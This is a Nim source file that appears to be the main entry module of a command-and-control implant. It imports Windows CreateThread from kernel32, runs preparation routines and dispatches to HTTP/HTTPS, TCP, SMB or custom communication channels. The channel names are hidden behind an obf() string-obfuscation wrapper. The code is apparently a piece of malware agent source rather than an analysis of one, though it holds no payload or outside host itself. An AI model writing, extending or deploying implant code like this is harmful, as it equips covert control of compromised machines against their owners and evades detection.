import ../utils/global
import ../utils/actions/prep
import http as httpRoutine
import ../capabilities/modes
import tcp as tcpRoutine
import smb as smbRoutine
import custom as customRoutine

proc CreateThread*(
  lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter: pointer;
  dwCreationFlags: culong;
  lpThreadId: ptr culong
): pointer {.stdcall, importc, dynlib: "kernel32".}

proc main_init*(): void =
  # Here is where preparations run and the channel routine is called
  main_preparations()
  if channel == obf("http") or channel == obf("https"):
    httpRoutine.main()
  elif channel == obf("tcp"):
    tcpRoutine.main()
  elif channel == obf("smb"):
    smbRoutine.main()
  elif channel == obf("custom"):
    customRoutine.main()
